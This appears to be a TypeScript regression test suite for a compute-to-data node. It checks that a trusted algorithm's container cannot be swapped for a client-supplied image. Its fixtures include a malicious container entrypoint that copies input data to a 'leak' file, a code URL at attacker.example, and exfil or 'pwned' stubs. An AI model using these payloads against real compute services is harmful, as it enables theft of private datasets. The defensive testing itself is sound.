import { expect } from 'chai'
import sinon from 'sinon'
import { DDOManager } from '@oceanprotocol/ddo-js'
import {
  bindAlgorithmContainerToDDO,
  validateAlgoForDataset
} from '../../components/core/compute/utils.js'
import { getAlgorithmImage } from '../../components/c2d/compute_engine_docker.js'
import { FindDdoHandler } from '../../components/core/handler/ddoHandler.js'
import { ComputeAlgorithm } from '../../@types/C2D/C2D.js'
import { genericComputeDDO, publishAlgoDDO } from '../data/ddo.js'
import {
  FreeComputeStartHandler,
  PaidComputeStartHandler
} from '../../components/core/compute/startCompute.js'

// Regression tests for the C2D trusted-algorithm container-binding vulnerability.
//
// The publisherTrustedAlgorithms check validates checksums computed from the
// algorithm's DDO, but the container that actually runs comes from the
// client-supplied algorithm.meta.container. Nothing bound the two, so a consumer
// could send a trusted documentId+serviceId (so the checksum check passes)
// together with a DIFFERENT meta.container and run an arbitrary image on the
// dataset. bindAlgorithmContainerToDDO() closes that gap by forcing the container
// meta of a PUBLISHED algorithm to come from its DDO.

const ALGO_DID = 'did:op:706d7452b1a25b183051fe02f2ad902d54fc45a43fdcee26b20f21684b5dee72'

// The attacker-controlled image a malicious consumer tries to smuggle in.
const MALICIOUS_CONTAINER = {
  entrypoint: 'sh -c "cat /data/inputs/* > /data/outputs/leak"',
  image: 'attacker/exfil',
  tag: 'latest',
  checksum: 'sha256:deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
}

// The legitimate container published in the algorithm DDO (publishAlgoDDO).
const DDO_CONTAINER = publishAlgoDDO.metadata.algorithm.container

// A resolvable clone of the published algorithm DDO. DDOManager.getDDOClass needs a
// `did:op` id (the shipped fixture has an empty id, as it is normally filled on index).
function algoDDO() {
  const ddo: any = structuredClone(publishAlgoDDO)
  ddo.id = ALGO_DID
  ddo.nftAddress = '0x0000000000000000000000000000000000000001'
  return ddo
}

// A resolvable DDO that is NOT an algorithm (a dataset): a documentId pointing here must
// be rejected rather than letting the client's meta.container survive.
function nonAlgorithmDDO() {
  const ddo: any = structuredClone(genericComputeDDO)
  ddo.id = 'did:op:dataset0000000000000000000000000000000000000000000000000000000000'
  ddo.nftAddress = '0x0000000000000000000000000000000000000002'
  return ddo
}

describe('bindAlgorithmContainerToDDO (C2D trusted-algo container binding)', () => {
  let findDdoStub: sinon.SinonStub

  beforeEach(() => {
    findDdoStub = sinon.stub(FindDdoHandler.prototype, 'findAndFormatDdo')
  })

  afterEach(() => {
    findDdoStub.restore()
  })

  it('overrides a mismatched client meta.container with the DDO container (attack blocked)', async () => {
    findDdoStub.resolves(algoDDO())

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      transferTxId: '0xorder',
      algocustomdata: { foo: 'bar' },
      meta: {
        language: 'python',
        version: '9.9',
        container: structuredClone(MALICIOUS_CONTAINER) as any
      }
    }

    await bindAlgorithmContainerToDDO(algorithm, {} as any)

    // The executed container is the DDO's, never the client's.
    expect(algorithm.meta.container.image).to.equal(DDO_CONTAINER.image)
    expect(algorithm.meta.container.tag).to.equal(DDO_CONTAINER.tag)
    expect(algorithm.meta.container.checksum).to.equal(DDO_CONTAINER.checksum)
    expect(algorithm.meta.container.entrypoint).to.equal(DDO_CONTAINER.entrypoint)
    expect(algorithm.meta.language).to.equal(publishAlgoDDO.metadata.algorithm.language)
    expect(algorithm.meta.version).to.equal(publishAlgoDDO.metadata.algorithm.version)

    // And the image the docker engine would actually run resolves to the DDO image.
    const image = getAlgorithmImage(algorithm, 'job-1')
    expect(image).to.equal(`${DDO_CONTAINER.image}@${DDO_CONTAINER.checksum}`)
    expect(image).to.not.contain(MALICIOUS_CONTAINER.image)

    // Client-owned fields (outside meta) are preserved.
    expect(algorithm.transferTxId).to.equal('0xorder')
    expect(algorithm.algocustomdata).to.deep.equal({ foo: 'bar' })
  })

  it('drops a client-supplied container.dockerfile for a published algorithm', async () => {
    findDdoStub.resolves(algoDDO())

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      meta: {
        container: {
          ...structuredClone(MALICIOUS_CONTAINER),
          dockerfile: 'FROM alpine\nRUN echo pwned'
        } as any
      }
    }

    await bindAlgorithmContainerToDDO(algorithm, {} as any)

    expect((algorithm.meta.container as any).dockerfile).to.equal(undefined)
    // Would otherwise return `<jobId>-image:latest` (a locally built image).
    const image = getAlgorithmImage(algorithm, 'job-1')
    expect(image).to.equal(`${DDO_CONTAINER.image}@${DDO_CONTAINER.checksum}`)
  })

  it('strips rawcode / dockerfile / additionalDockerFiles carried by the DDO itself (not checksum-covered)', async () => {
    // The container checksum only hashes (entrypoint + container.checksum) and the files
    // checksum only covers the service files, so these fields could change the executed
    // code/image without changing the trusted checksums. structuredClone would otherwise
    // preserve them (rawcode is a standard MetadataAlgorithm field).
    const ddoWithBuildFields = algoDDO()
    ddoWithBuildFields.metadata.algorithm.rawcode = 'import os; os.system("exfil")'
    ddoWithBuildFields.metadata.algorithm.container.dockerfile = 'FROM alpine\nRUN pwned'
    ddoWithBuildFields.metadata.algorithm.container.additionalDockerFiles = {
      'evil.sh': 'cat /data/inputs/* > /data/outputs/leak'
    }
    findDdoStub.resolves(ddoWithBuildFields)

    const algorithm: ComputeAlgorithm = { documentId: ALGO_DID, serviceId: '0' }

    const outcome = await bindAlgorithmContainerToDDO(algorithm, {} as any)

    expect(outcome).to.equal('bound')
    expect((algorithm.meta as any).rawcode).to.equal(undefined)
    expect((algorithm.meta.container as any).dockerfile).to.equal(undefined)
    expect((algorithm.meta.container as any).additionalDockerFiles).to.equal(undefined)
    // The pinned, checksummed image is used - never a locally built one.
    const image = getAlgorithmImage(algorithm, 'job-1')
    expect(image).to.equal(`${DDO_CONTAINER.image}@${DDO_CONTAINER.checksum}`)
  })

  it('drops a client-supplied fileObject for a published algorithm (code comes from the DDO service)', async () => {
    findDdoStub.resolves(algoDDO())

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      // Attacker code file: checksums are validated from the DDO service files, but
      // resolveComputeFileObject (uploadData) honors fileObject BEFORE documentId+serviceId,
      // so this would run the attacker's code under a trusted DID if left in place.
      fileObject: {
        type: 'url',
        url: 'https://attacker.example/evil.py',
        method: 'GET'
      } as any,
      meta: {
        container: structuredClone(MALICIOUS_CONTAINER) as any
      }
    }

    const outcome = await bindAlgorithmContainerToDDO(algorithm, {} as any)

    expect(outcome).to.equal('bound')
    // fileObject stripped -> resolveComputeFileObject falls back to the DDO's documentId+serviceId.
    expect(algorithm.fileObject).to.equal(undefined)
    expect(algorithm.documentId).to.equal(ALGO_DID)
    expect(algorithm.serviceId).to.equal('0')
  })

  it('no regression: raw-code algorithm keeps its client fileObject', async () => {
    const algorithm: ComputeAlgorithm = {
      fileObject: { type: 'url', url: 'https://example/algo.py', method: 'GET' } as any,
      meta: { container: structuredClone(MALICIOUS_CONTAINER) as any }
    }

    expect(await bindAlgorithmContainerToDDO(algorithm, {} as any)).to.equal('skipped')
    expect(algorithm.fileObject).to.not.equal(undefined)
  })

  it('control: published algorithm with NO client meta still gets the DDO container', async () => {
    findDdoStub.resolves(algoDDO())

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0'
    }

    await bindAlgorithmContainerToDDO(algorithm, {} as any)

    expect(algorithm.meta.container).to.deep.equal({
      entrypoint: DDO_CONTAINER.entrypoint,
      image: DDO_CONTAINER.image,
      tag: DDO_CONTAINER.tag,
      checksum: DDO_CONTAINER.checksum
    })
  })

  it('no regression: raw-code algorithm (no documentId) keeps its client meta', async () => {
    const algorithm: ComputeAlgorithm = {
      meta: {
        rawcode: 'console.log("hello")',
        container: structuredClone(MALICIOUS_CONTAINER) as any
      } as any
    }

    await bindAlgorithmContainerToDDO(algorithm, {} as any)

    // Raw-code meta is legitimate and governed by the dataset's allowRawAlgorithm.
    expect(findDdoStub.called).to.equal(false)
    expect(algorithm.meta.container).to.deep.equal(MALICIOUS_CONTAINER)
    expect((algorithm.meta as any).rawcode).to.equal('console.log("hello")')
    const image = getAlgorithmImage(algorithm, 'job-1')
    expect(image).to.equal(`${MALICIOUS_CONTAINER.image}@${MALICIOUS_CONTAINER.checksum}`)
  })

  it('signals "invalid" when a published documentId cannot be resolved', async () => {
    findDdoStub.resolves(null)

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      meta: { container: structuredClone(MALICIOUS_CONTAINER) as any }
    }

    const outcome = await bindAlgorithmContainerToDDO(algorithm, {} as any)

    // A claimed-published algorithm we cannot verify must be rejected (caller -> 400),
    // not left for downstream checks. The client meta is left untouched (never run).
    expect(outcome).to.equal('invalid')
    expect(algorithm.meta.container).to.deep.equal(MALICIOUS_CONTAINER)
  })

  it('preserves DDO-declared meta fields beyond the container basics (no allowlist drop)', async () => {
    // A published algo DDO whose metadata.algorithm carries extra legitimate fields
    // (container.consumerParameters) that a 4-field allowlist would silently drop.
    const ddoWithExtras = algoDDO()
    ddoWithExtras.metadata.algorithm.container.consumerParameters = [
      {
        name: 'iterations',
        type: 'number',
        label: 'Iterations',
        required: true,
        default: 1
      }
    ]
    findDdoStub.resolves(ddoWithExtras)

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      meta: { container: structuredClone(MALICIOUS_CONTAINER) as any }
    }

    await bindAlgorithmContainerToDDO(algorithm, {} as any)

    // The whole DDO container (incl. consumerParameters) is taken from the DDO.
    expect((algorithm.meta.container as any).consumerParameters).to.deep.equal(
      ddoWithExtras.metadata.algorithm.container.consumerParameters
    )
    expect(algorithm.meta.container.image).to.equal(DDO_CONTAINER.image)
    // ...and the client container is gone entirely.
    expect(algorithm.meta.container.image).to.not.equal(MALICIOUS_CONTAINER.image)
  })

  it('uses an already-resolved DDO without a second fetch (one-fetch guarantee)', async () => {
    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      meta: { container: structuredClone(MALICIOUS_CONTAINER) as any }
    }

    // Pass the resolved DDO explicitly; the helper must NOT call findAndFormatDdo.
    const outcome = await bindAlgorithmContainerToDDO(algorithm, {} as any, algoDDO())

    expect(outcome).to.equal('bound')
    expect(findDdoStub.called).to.equal(false)
    expect(algorithm.meta.container.image).to.equal(DDO_CONTAINER.image)
  })

  it('signals "invalid" (not a silent no-op) for a documentId that resolves to a non-algorithm DDO', async () => {
    findDdoStub.resolves(nonAlgorithmDDO())

    const algorithm: ComputeAlgorithm = {
      documentId: ALGO_DID,
      serviceId: '0',
      meta: { container: structuredClone(MALICIOUS_CONTAINER) as any }
    }

    const outcome = await bindAlgorithmContainerToDDO(algorithm, {} as any)

    // The caller must reject (400); the client meta is left untouched (never run).
    expect(outcome).to.equal('invalid')
    expect(algorithm.meta.container).to.deep.equal(MALICIOUS_CONTAINER)
  })

  it('signals "skipped" only for a raw-code algorithm (no documentId)', async () => {
    const rawAlgo: ComputeAlgorithm = {
      meta: {
        rawcode: 'print(1)',
        container: structuredClone(MALICIOUS_CONTAINER)
      } as any
    }
    expect(await bindAlgorithmContainerToDDO(rawAlgo, {} as any)).to.equal('skipped')

    // A documentId that does not resolve is NOT skipped - it is rejected as 'invalid'.
    findDdoStub.resolves(null)
    const publishedButMissing: ComputeAlgorithm = { documentId: ALGO_DID, serviceId: '0' }
    expect(await bindAlgorithmContainerToDDO(publishedButMissing, {} as any)).to.equal(
      'invalid'
    )
  })
})

describe('validateAlgoForDataset (trusted-algo allow/deny still holds)', () => {
  // Clone the known-good compute dataset fixture and only override the trusted list.
  function datasetDDO(trustedAlgorithms: any[]) {
    const ddo: any = structuredClone(genericComputeDDO)
    ddo.id = 'did:op:dataset0000000000000000000000000000000000000000000000000000000000'
    ddo.services[0].compute = {
      allowRawAlgorithm: false,
      allowNetworkAccess: true,
      publisherTrustedAlgorithmPublishers: [],
      publisherTrustedAlgorithms: trustedAlgorithms
    }
    return ddo
  }
  const DATASET_SERVICE_ID = genericComputeDDO.services[0].id

  const checksums = {
    files: 'filesChecksumAAA',
    container: 'containerChecksumAAA',
    serviceId: '0'
  }

  it('allows an algorithm whose did+checksums are in the trusted list', async () => {
    const ddo = datasetDDO([
      {
        did: ALGO_DID,
        filesChecksum: checksums.files,
        containerSectionChecksum: checksums.container
      }
    ])
    const ddoInstance = DDOManager.getDDOClass(ddo)
    const result = await validateAlgoForDataset(
      ALGO_DID,
      checksums,
      ddoInstance,
      DATASET_SERVICE_ID,
      {} as any
    )
    expect(result).to.equal(true)
  })

  it('rejects an untrusted documentId (not in the trusted list)', async () => {
    const ddo = datasetDDO([
      {
        did: ALGO_DID,
        filesChecksum: checksums.files,
        containerSectionChecksum: checksums.container
      }
    ])
    const ddoInstance = DDOManager.getDDOClass(ddo)
    const result = await validateAlgoForDataset(
      'did:op:someOtherUntrustedAlgo000000000000000000000000000000000000000000',
      checksums,
      ddoInstance,
      DATASET_SERVICE_ID,
      {} as any
    )
    expect(result).to.equal(false)
  })

  it('rejects a trusted did whose container checksum does not match', async () => {
    const ddo = datasetDDO([
      {
        did: ALGO_DID,
        filesChecksum: checksums.files,
        containerSectionChecksum: 'someOtherContainerChecksum'
      }
    ])
    const ddoInstance = DDOManager.getDDOClass(ddo)
    const result = await validateAlgoForDataset(
      ALGO_DID,
      checksums,
      ddoInstance,
      DATASET_SERVICE_ID,
      {} as any
    )
    expect(result).to.equal(false)
  })
})

// Handler-level regression tests. The helper tests above call the binding directly, so
// they would NOT catch a handler that stopped invoking the binding step. These drive the
// real PaidComputeStartHandler / FreeComputeStartHandler through handle() with the
// reporter's exact payload (trusted documentId + mismatched meta.container) and assert the
// algorithm actually handed to engine.startComputeJob carries the DDO container. The binding
// step (bindAndChecksumAlgorithm) is left REAL; only the heavy, un-stubbable validation
// steps are stubbed on the instance.
describe('Start handlers bind the DDO container end-to-end (handler-level regression)', () => {
  beforeEach(() => {
    sinon.stub(FindDdoHandler.prototype, 'findAndFormatDdo').resolves(algoDDO())
  })

  afterEach(() => {
    sinon.restore()
  })

  // Fake OceanNode + engine that let handle() reach engine.startComputeJob WITHOUT network:
  // getKeyManager().decrypt throws so getAlgoChecksums' file read fails fast (free has no
  // checksum gate; paid's gate is stubbed to null).
  function makeNodeAndEngine() {
    const engine: any = {
      checkAndFillMissingResources: sinon.stub().resolves([{ id: 'cpu', amount: 1 }]),
      getEnvPricesForToken: sinon.stub().returns({ cpu: 1 }),
      getResourcePrice: sinon.stub().returns(1),
      calculateResourcesCost: sinon.stub().returns(0),
      escrow: {
        createLock: sinon.stub().resolves('0xlock'),
        getMinLockTime: sinon.stub().returns(1),
        cancelExpiredLock: sinon.stub().resolves(undefined)
      },
      startComputeJob: sinon.stub().resolves({ jobId: 'job-xyz' })
    }
    const node: any = {
      getC2DEngines: () => ({ getC2DByHash: () => Promise.resolve(engine) }),
      getConfig: () => ({ supportedNetworks: { 8996: { chainId: 8996 } } }),
      getKeyManager: () => ({
        decrypt: () => Promise.reject(new Error('decrypt disabled in unit test'))
      })
    }
    return { node, engine }
  }

  function stubCommonHandlerSteps(handler: any, env: any) {
    sinon
      .stub(handler, 'verifyParamsAndRateLimits')
      .resolves({ status: { httpStatus: 200 } })
    sinon.stub(handler, 'shouldDenyTaskHandling').returns(false)
    sinon
      .stub(handler, 'validateTokenOrSignature')
      .resolves({ status: { httpStatus: 200 } })
    sinon.stub(handler, 'resolveEnvironment').resolves({ env, allEnvs: [env] })
    sinon.stub(handler, 'ensureResourcesAvailable').resolves(null)
    sinon.stub(handler, 'applyMaxJobDuration')
    sinon.stub(handler, 'checkPersistentStorageAcl').resolves(null)
    sinon.stub(handler, 'validateOutputs').resolves(null)
    sinon.stub(handler, 'validateAssets').resolves(null)
    // bindAndChecksumAlgorithm is intentionally NOT stubbed - it performs the bind.
  }

  function attackTask(extra: any = {}) {
    return {
      command: 'startCompute',
      consumerAddress: '0x0000000000000000000000000000000000000abc',
      signature: '0x',
      nonce: '1',
      environment: 'enginehash-env0',
      algorithm: {
        documentId: ALGO_DID,
        serviceId: '0',
        transferTxId: '0xorder',
        meta: { container: structuredClone(MALICIOUS_CONTAINER) }
      },
      datasets: [
        { documentId: 'did:op:dataset1', serviceId: '0', transferTxId: '0xorder2' }
      ],
      resources: [{ id: 'cpu', amount: 1 }],
      maxJobDuration: 100,
      ...extra
    }
  }

  function assertBoundContainer(engine: any) {
    expect(engine.startComputeJob.calledOnce).to.equal(true)
    const algoArg = engine.startComputeJob.firstCall.args[1]
    expect(algoArg.meta.container.image).to.equal(DDO_CONTAINER.image)
    expect(algoArg.meta.container.tag).to.equal(DDO_CONTAINER.tag)
    expect(algoArg.meta.container.checksum).to.equal(DDO_CONTAINER.checksum)
    expect(algoArg.meta.container.entrypoint).to.equal(DDO_CONTAINER.entrypoint)
    // the attacker image never reaches the engine
    expect(algoArg.meta.container.image).to.not.equal(MALICIOUS_CONTAINER.image)
  }

  it('PaidComputeStartHandler runs the DDO container, not the client meta.container', async () => {
    const { node, engine } = makeNodeAndEngine()
    const handler: any = new PaidComputeStartHandler(node)
    const env: any = {
      id: 'enginehash-env0',
      maxJobDuration: 3600,
      consumerAddress: '0xenv',
      access: undefined
    }
    stubCommonHandlerSteps(handler, env)
    // paid gate would 500 on the (intentionally empty) test checksums; bypass it so we can
    // assert the binding reaches the engine.
    sinon.stub(handler, 'enforceAlgoChecksums').returns(null)

    const task = attackTask({ payment: { chainId: 8996, token: '0xtoken' } })
    const response = await handler.handle(task)

    expect(response.status.httpStatus).to.equal(200)
    assertBoundContainer(engine)
  })

  it('FreeComputeStartHandler runs the DDO container, not the client meta.container', async () => {
    const { node, engine } = makeNodeAndEngine()
    const handler: any = new FreeComputeStartHandler(node)
    const env: any = {
      id: 'enginehash-env0',
      free: { access: undefined, maxJobDuration: 60 }
    }
    stubCommonHandlerSteps(handler, env)

    const task = attackTask()
    const response = await handler.handle(task)

    expect(response.status.httpStatus).to.equal(200)
    assertBoundContainer(engine)
  })

  it('FreeComputeStartHandler rejects a non-algorithm documentId with 400 and starts no job', async () => {
    const { node, engine } = makeNodeAndEngine()
    ;(FindDdoHandler.prototype.findAndFormatDdo as sinon.SinonStub).resolves(
      nonAlgorithmDDO()
    )
    const handler: any = new FreeComputeStartHandler(node)
    const env: any = {
      id: 'enginehash-env0',
      free: { access: undefined, maxJobDuration: 60 }
    }
    stubCommonHandlerSteps(handler, env)

    const task = attackTask()
    const response = await handler.handle(task)

    expect(response.status.httpStatus).to.equal(400)
    expect(response.status.error).to.contain('is not a valid algorithm asset')
    expect(engine.startComputeJob.called).to.equal(false)
  })

  it('PaidComputeStartHandler rejects a non-algorithm documentId with 400 and starts no job', async () => {
    const { node, engine } = makeNodeAndEngine()
    ;(FindDdoHandler.prototype.findAndFormatDdo as sinon.SinonStub).resolves(
      nonAlgorithmDDO()
    )
    const handler: any = new PaidComputeStartHandler(node)
    const env: any = {
      id: 'enginehash-env0',
      maxJobDuration: 3600,
      consumerAddress: '0xenv',
      access: undefined
    }
    stubCommonHandlerSteps(handler, env)

    const task = attackTask({ payment: { chainId: 8996, token: '0xtoken' } })
    const response = await handler.handle(task)

    expect(response.status.httpStatus).to.equal(400)
    expect(response.status.error).to.contain('is not a valid algorithm asset')
    expect(engine.startComputeJob.called).to.equal(false)
  })
})
